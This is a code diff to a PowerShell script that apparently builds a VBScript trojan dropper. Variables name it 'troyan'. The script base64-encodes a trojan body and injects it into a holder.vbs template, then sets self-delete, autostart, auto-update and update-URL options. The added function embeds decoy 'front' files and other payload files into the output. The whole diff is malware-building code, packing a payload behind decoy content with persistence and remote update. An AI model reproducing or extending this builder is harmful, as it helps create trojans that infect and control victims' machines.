@@ -56,12 +56,66 @@ Function Check-Array {
     }
 }
 
-$body = Encode-FileToBase64 -inFile $server.troyanHolder
+
+
+
+function Create-EmbeddingFiles {
+    param (
+        [string]$name
+    )
+
+    $srcFolder = Join-Path -Path $server.userDataDir -ChildPath "$name"
+
+    if (-not (Test-Path -Path $srcFolder))
+    {
+        $files = @()
+    } else
+    {
+        $files = (Get-ChildItem -Path $srcFolder -File) 
+    }
+    if ($null -eq $files){
+        $files = @()
+    }
+    if (-not ($files.GetType().Name -eq 'Object[]')) {
+        $files = @($files)
+    }
+    
+    $resultName = @()
+    $resultData = @()
+    foreach ($file in $files) {
+        $filename = [System.IO.Path]::GetFileName($file.FullName)
+        $data= Encode-FileToBase64 -inFile $file.FullName
+        $resultData += $data
+        $resultName += $filename
+    }
+    if (Check-Array -InputObject $resultData -eq $true)
+    {
+        $joinedResultName = Convert-ArrayToQuotedString -Array $resultName
+        $joinedResultData = Convert-ArrayToQuotedString -Array $resultData
+        return ($joinedResultName, $joinedResultData)
+    } else {
+        return ($null, $null)
+    }
+}
+
+
+$body = Encode-FileToBase64 -inFile $server.troyanBody
 
 $holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")
 
 $result = $holder
+$result = $result -replace '__selfDel', 'False'
+$result = $result -replace '__autostart', $server.autoStart
+$result = $result -replace '__autoupdate', $server.autoUpdate
+$result = $result -replace '__updateurl', $server.updateUrl
 $result = $result -replace '0102', $body
+
+($name, $data) = Create-EmbeddingFiles -name "front"
+$result = $result -replace '"__frontData"', $data
+$result = $result -replace '"__frontName"', $name
+($name, $data) = Create-EmbeddingFiles -name "embeddings"
+$result = $result -replace '"__backData"', $data
+$result = $result -replace '"__backName"', $name
 
 $result | Set-Content $server.troyanVbsFile
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
